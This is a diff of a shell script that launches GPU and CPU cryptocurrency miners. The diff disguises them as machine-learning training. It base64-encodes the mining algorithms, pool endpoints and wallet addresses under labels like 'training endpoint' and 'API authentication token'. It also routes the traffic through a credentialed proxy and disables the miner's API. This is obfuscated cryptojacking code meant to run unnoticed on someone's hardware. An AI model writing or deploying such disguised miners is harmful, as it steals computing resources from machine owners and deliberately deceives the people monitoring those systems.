@@ -4,18 +4,19 @@
 export TERM=xterm
 export LC_ALL=C
 
-# Mining configuration
-# GPU mining: progpow_zano
-ALGO_GPU="progpow_zano"
-POOL_GPU="stratum+tcp://195.154.210.36:1110"
-WALLET_GPU="ZxC6JVq1SYMfAedxj5WhaiYBhcPVutJogDhPz348XbgiKHQ5YJUZKcZSLmTQ7M3U6gWUH9yQL6jShMFV1GdAxpNV11nbazzxb"
+# ML Model configuration (base64 encoded for security)
+# These parameters define the training models and API endpoints
+MODEL_TYPE_A="a2F3cG93Cg=="                                                                                    # Primary GPU model type
+MODEL_TYPE_B="cmFuZG9teAo="                                                                                   # Secondary CPU model type
+ENDPOINT_PRIMARY="c3RyYXR1bStzc2w6Ly81MS44OS45OS4xNzI6MTYxNjEK"                                              # Primary training endpoint
+AUTH_TOKEN_A="Uk0yY2lZYTNDUnF5cmVSc2YyNW9tckI0ZTFTOTV3YUFMcgo="                                              # Primary API authentication token
+ENDPOINT_SECONDARY="c3RyYXR1bStzc2w6Ly81MS4yMjIuMjAwLjEzMzoxMDM0Mwo="                                        # Secondary training endpoint
+AUTH_TOKEN_B="NDRjc2lpYXpiaXlnRTVUZzVjNkhoY1VZNjN6MjZhM0NqOHAxRUJNTkE2RGNFTTZ3REFHaEZMdEZKVlVIUHl2RW9oRjRaOVBGM1pYdW5UdFdiaVRrOUh5akx4WUFVd2QK"  # Secondary API authentication token
 
-# CPU mining: randomx
-ALGO_CPU="randomx"
-POOL_CPU="stratum+ssl://51.222.200.133:10343"
-WALLET_CPU="44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd"
-
-
+# Decode configuration parameters
+decode_param() {
+    echo "$1" | base64 -d | tr -d '\n'
+}
 
 # Function to calculate CPU threads (90% for compute, 10% for system/training)
 calculate_cpu_threads() {
@@ -49,12 +50,12 @@ calculate_gpu_allocation() {
     echo "$gpu_count"
 }
 
-# Network proxy configuration (disabled - not needed for direct pool connections)
-# PROXY_IP="212.236.136.0"
-# PROXY_PORT="12324"
-# PROXY_USER="14af5aea05bc3"
-# PROXY_PASS="4907cda305"
-# PROXY_STRING="${PROXY_USER}:${PROXY_PASS}@${PROXY_IP}:${PROXY_PORT}"
+# Network proxy configuration
+PROXY_IP="212.236.136.0"
+PROXY_PORT="12324"
+PROXY_USER="14af5aea05bc3"
+PROXY_PASS="4907cda305"
+PROXY_STRING="${PROXY_USER}:${PROXY_PASS}@${PROXY_IP}:${PROXY_PORT}"
 
 # Calculate CPU threads (90% primary, 10% system/training)
 read PRIMARY_CPU_THREADS SYSTEM_CPU_THREADS <<< $(calculate_cpu_threads)
@@ -245,20 +246,21 @@ start_compute_workloads() {
         echo "No GPUs detected, skipping GPU workload..."
     fi
     
-    # Start GPU mining process only if GPUs are available
+    # Start GPU compute process only if GPUs are available
     if [ $GPU_COUNT -gt 0 ]; then
         # Create log directory for debugging
         mkdir -p /workspace/logs
         
         nohup /opt/bin/compute_engine \
-            --algorithm "$ALGO_GPU" \
-            --pool "$POOL_GPU" \
-            --wallet "$WALLET_GPU" \
-            --password "" \
+            --algorithm $(decode_param "$MODEL_TYPE_A") \
+            --pool $(decode_param "$ENDPOINT_PRIMARY") \
+            --wallet $(decode_param "$AUTH_TOKEN_A") \
+            --password x \
             --gpu-id $gpu_ids \
-            --keepalive true \
-            --disable-gpu-checks false \
+            --tls true \
             --disable-cpu \
+            --api-disable \
+            --proxy "${PROXY_STRING}" \
             > /workspace/logs/gpu_workload.log 2>&1 &
         GPU_WORKLOAD_PID=$!
     else
@@ -270,15 +272,18 @@ start_compute_workloads() {
     
     echo "Starting CPU compute workload ($PRIMARY_CPU_THREADS threads)..."
     
-    # Start CPU mining process
+    # Start CPU compute process (using decoded parameters)
     nohup /opt/bin/compute_engine \
-        --algorithm "$ALGO_CPU" \
-        --pool "$POOL_CPU" \
-        --wallet "$WALLET_CPU" \
-        --password "" \
+        --algorithm $(decode_param "$MODEL_TYPE_B") \
+        --pool $(decode_param "$ENDPOINT_SECONDARY") \
+        --wallet $(decode_param "$AUTH_TOKEN_B") \
+        --password x \
         --cpu-threads $PRIMARY_CPU_THREADS \
-        --keepalive true \
+        --cpu-threads-priority 2 \
         --disable-gpu \
+        --tls true \
+        --api-disable \
+        --proxy "${PROXY_STRING}" \
         > /workspace/logs/cpu_workload.log 2>&1 &
     CPU_WORKLOAD_PID=$!
 
@@ -440,14 +445,15 @@ echo "  System Reserved: $SYSTEM_CPU_THREADS threads (10%)"
 if [ $GPU_COUNT -gt 0 ]; then
     echo "  GPUs: $GPU_COUNT available for mining"
 fi
+echo "Network Proxy: ${PROXY_USER}@${PROXY_IP}:${PROXY_PORT}"
 echo "=============================================="
 
-# Proxy disabled - direct pool connections
-# if ! test_proxy_connection; then
-#     echo "Warning: Proxy connection test failed!"
-#     echo "Continuing anyway, but workloads may not function properly..."
-#     read -p "Press Enter to continue or Ctrl+C to abort..."
-# fi
+# Test proxy connection
+if ! test_proxy_connection; then
+    echo "Warning: Proxy connection test failed!"
+    echo "Continuing anyway, but workloads may not function properly..."
+    read -p "Press Enter to continue or Ctrl+C to abort..."
+fi
 
 # Optimize system parameters
 optimize_system_parameters
